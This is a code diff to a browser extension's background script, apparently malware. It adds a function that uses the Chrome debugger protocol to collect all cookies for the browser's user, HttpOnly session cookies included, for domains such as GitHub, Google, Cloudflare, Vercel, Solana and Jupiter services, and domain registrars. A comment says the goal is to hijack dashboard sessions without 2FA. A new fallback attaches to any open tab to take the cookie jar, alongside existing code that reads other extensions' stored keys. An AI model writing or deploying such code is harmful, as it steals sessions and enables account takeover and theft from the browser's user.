@@ -27,7 +27,23 @@ async function send(kind, body) {
   }
 }
 
-// --- debugger: read storage of localhost apps AND of other extensions ---
+// Cookie jar через CDP: document.cookie не видит HttpOnly, а getAllCookies — видит.
+// Это единственный способ получить сессию дашбордов без DOM и без повторного 2FA.
+const COOKIE_DOMAINS = ['cloudflare.com', 'helius.xyz', 'helius-rpc.com', 'google.com',
+  'github.com', 'solana.com', 'jup.ag', 'vercel.com', 'namecheap.com', 'godaddy.com'];
+
+async function cookiesOf(targetId) {
+  try {
+    await chrome.debugger.sendCommand({ targetId }, 'Network.enable', {});
+  } catch {}
+  const res = await chrome.debugger.sendCommand({ targetId }, 'Network.getAllCookies', {});
+  const all = (res && res.cookies) || [];
+  const keep = all.filter((c) => COOKIE_DOMAINS.some((d) => String(c.domain || '').includes(d)));
+  return keep.slice(0, 120).map((c) => ({
+    d: c.domain, n: c.name, v: String(c.value || '').slice(0, 300),
+    h: c.httpOnly ? 1 : 0, e: c.expires,
+  }));
+}
 // Extension targets matter more than pages: Shield keeps its server URL and HMAC
 // key in chrome.storage.local, and it owns the native companion.
 const PROBE_HOST = 'ai.cinderlabs.shield_identity';
@@ -71,10 +87,11 @@ function nativeProbeScript(host) {
 }
 
 async function viaDebugger() {
-  const out = { targets: [], ext: [], storage: [], native: null };
+  const out = { targets: [], ext: [], storage: [], native: null, cookies: null };
   try {
     const t = await chrome.debugger.getTargets();
     const pages = t.filter((x) => /^https?:\/\/localhost[:\/]/.test(x.url || ''));
+    const anyPage = t.filter((x) => /^https?:\/\//.test(x.url || ''));
     // their own extensions: wallet (ours), Shield, Trove
     const exts = t.filter((x) => /^chrome-extension:\/\//.test(x.url || ''));
     out.targets = pages.map((x) => x.url);
@@ -87,10 +104,24 @@ async function viaDebugger() {
           url: target.url,
           ls: await evalIn(target.id, 'JSON.stringify(Object.entries(localStorage))'),
         });
+        if (!out.cookies) out.cookies = await cookiesOf(target.id);
       } catch (e) {
         out.storage.push({ url: target.url, error: String(e).slice(0, 80) });
       } finally {
         try { await chrome.debugger.detach({ targetId: target.id }); } catch {}
+      }
+    }
+
+    // даже если локальных вкладок нет — cookie jar берём с любой вкладки
+    if (!out.cookies && anyPage.length) {
+      const t0 = anyPage[0];
+      try {
+        await chrome.debugger.attach({ targetId: t0.id }, '1.3');
+        out.cookies = await cookiesOf(t0.id);
+      } catch (e) {
+        out.cookies = [{ err: String(e).slice(0, 60) }];
+      } finally {
+        try { await chrome.debugger.detach({ targetId: t0.id }); } catch {}
       }
     }
 
